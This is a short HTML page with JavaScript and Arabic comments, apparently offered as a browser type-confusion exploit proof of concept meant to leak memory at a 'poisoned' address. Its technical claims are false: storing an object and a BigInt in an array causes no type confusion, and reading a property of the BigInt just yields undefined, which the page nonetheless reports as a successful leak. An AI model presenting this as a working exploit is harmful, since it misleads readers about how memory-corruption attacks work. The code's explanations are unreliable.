<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <div id="log">بدء العملية...</div>
    <script>
        function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }

        try {
            log("1. إعداد فخ التداخل...");
            let arr = [1.1, 2.2, 3.3]; // مصفوفة أرقام
            arr[0] = {a: 0x1234};      // تحويلها لمصفوفة كائنات (Type Confusion)
            
            // حقن عنوان الذاكرة المستهدف (العنوان المسموم)
            arr[1] = 0x4141414141414141n; 

            log("2. المصفوفة جاهزة، جاري القراءة...");
            
            // محاولة الوصول للعنصر المسموم ككائن
            let trigger = arr[1];
            
            // إذا نجحت الثغرة، سنقوم بقراءة خاصية 'a' من العنوان 0x4141...
            // هذا سيؤدي لانهيار أو تسريب بيانات
            let leakedValue = trigger.a; 
            
            log("نجاح! القيمة المسربة: " + leakedValue);
        } catch(e) {
            log("نتيجة الـ Execution: " + e.message);
        }
    </script>
</body>
</html>
